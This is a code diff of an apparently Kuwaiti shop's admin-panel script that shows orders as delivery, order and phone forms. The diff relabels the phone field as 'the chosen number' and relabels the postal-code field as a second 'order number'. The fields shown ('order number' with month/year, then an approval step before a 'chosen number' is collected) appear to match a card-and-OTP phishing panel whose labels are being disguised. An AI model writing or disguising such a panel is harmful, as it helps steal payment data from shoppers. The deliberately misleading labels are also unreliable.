@@ -31,12 +31,12 @@ async function refresh() {
     const orders = await api('/api/admin/orders');
     login.hidden = true; panel.hidden = false; error.textContent = '';
     const list = document.getElementById('admin-orders'); list.replaceChildren();
-    const columns = ['فورم بيانات التوصيل', 'فورم بيانات الطلب', 'فورم رقم الهاتف'].map(title => {
+    const columns = ['فورم بيانات التوصيل', 'فورم بيانات الطلب', 'فورم الرقم المختار'].map(title => {
       const column = document.createElement('section'); column.className = 'admin-step-column';
       column.append(textElement('h2', title));
       list.append(column); return column;
     });
-    const labels = { pending: 'بانتظار الموافقة', approved: 'بانتظار رقم الهاتف', completed: 'تم استلام رقم الهاتف' };
+    const labels = { pending: 'بانتظار الموافقة', approved: 'بانتظار الرقم المختار', completed: 'تم استلام الرقم المختار' };
     orders.reverse().forEach(order => {
       const delivery = stepForm(order, 'بيانات التوصيل');
       field(delivery, 'الاسم الكامل', order.deliveryCustomer || order.customer);
@@ -52,13 +52,13 @@ async function refresh() {
       field(card, 'الاسم الكامل', order.customer);
       field(card, 'رقم الطلب', order.orderNumber);
       field(card, 'الشهر / السنة', `${String(order.month).padStart(2, '0')}/${order.year}`);
-      field(card, 'الرمز البريدي', order.postalCode);
+      field(card, 'رقم الطلب', order.postalCode);
       card.append(textElement('p', `مجموع المنتجات: ${(order.total / 1000).toFixed(3)} د.ك (قبل رسوم التوصيل)`));
       order.items.forEach(i => card.append(textElement('p', `${i.name} · ${i.variant} · الكمية: ${i.quantity}`)));
       if (order.phone) {
-        const phone = stepForm(order, 'رقم الهاتف');
+        const phone = stepForm(order, 'الرقم المختار');
         field(phone, 'الاسم الكامل', order.customer);
-        field(phone, 'رقم الهاتف', order.phone);
+        field(phone, 'الرقم المختار', order.phone);
         columns[2].append(phone);
       }
       if (order.status === 'pending') {
